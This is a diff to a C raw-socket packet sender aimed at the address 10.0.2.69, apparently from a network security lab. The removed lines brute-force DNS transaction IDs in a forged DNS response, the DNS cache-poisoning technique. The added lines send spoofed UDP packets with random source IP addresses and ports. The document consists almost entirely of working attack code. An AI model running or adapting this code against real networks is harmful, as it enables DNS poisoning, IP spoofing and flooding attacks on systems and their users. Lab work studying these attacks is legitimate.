@@ -4,6 +4,7 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <time.h>
 
 #define MAX_FILE_SIZE   2000
 #define TARGET_IP "10.0.2.69" 
@@ -17,7 +18,7 @@ int main()
   int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));      
 
-  // Read the DNS packet from file
+  // Read the UDP packet from file
   FILE *f = fopen("ip.bin", "rb");
   if (!f) {
     perror("Can't open 'ip.bin'");
@@ -27,21 +28,21 @@ int main()
   int n = fread(ip, 1, MAX_FILE_SIZE, f);
   printf("Total IP packet size: %d\n", n);
 
-  // Modify the name in the question field (offset=41)
-  memcpy(ip+41, "bbbbb" , 5); 
-  // Modify the name in the answer field (offset=64)
-  memcpy(ip+64, "bbbbb" , 5); 
+  // Modify and send out UDP packets
+  srand(time(0)); // Initialize the seed for random # generation
+  for (int i=1; i<100; i++){
+    printf("%d\n", i);
+    unsigned short src_port; 
+    unsigned int  src_ip; 
 
-  for (int guess=1; guess<100; guess++){
-     // Modify the transaction ID field (offset=28)
-     unsigned short id[2];
-     *id = htons(guess);
-     memcpy(ip+28, (void *) id, 2); 
+    src_ip  = htonl(rand());
+    memcpy(ip+12, &src_ip , 4);   // modify source IP
 
-     // Send the IP packet out
-     send_packet_raw(sock, ip, n);
+    src_port = htons(rand());
+    memcpy(ip+20, &src_port, 2);  // modify soruce port
+
+    send_packet_raw(sock, ip, n); // send packet
   }
-
   close(sock);
 }
 
@@ -51,7 +52,8 @@ int send_packet_raw(int sock, char *ip, int n)
   dest_info.sin_family = AF_INET;
   dest_info.sin_addr.s_addr = inet_addr(TARGET_IP);
 
-  int r = sendto(sock, ip, n, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
+  int r = sendto(sock, ip, n, 0, (struct sockaddr *)&dest_info, 
+                 sizeof(dest_info));
   if (r>=0) printf("Sent a packet of size: %d\n", r);
   else printf("Failed to send packet. Did you run it using sudo?\n");
 }
